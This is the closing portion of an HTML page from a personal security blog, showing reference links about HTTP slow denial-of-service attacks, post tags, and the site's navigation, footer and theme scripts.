<li><a target="_blank" rel="noopener" href="https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoliu66007/p/10174672.html">https://www.cnblogs.com/xiaoliu66007/p/10174672.html</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/zh/thread-293945.html">https://forum.huawei.com/enterprise/zh/thread-293945.html</a></li>
</ul>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
</section>


  <nav id="page-nav" class="clearfix">
    
    <a class="prev" rel="prev" href="/page/4/">
      <span class="icon icon-chevron-left"></span>
      <span class="text">Previous</span>
    </a>
    
    
    <a class="next" rel="next" href="/page/6/">
      <span class="text">Next</span>
      <span class="icon icon-chevron-right"></span>
    </a>
    
  </nav>

        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/artchen" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
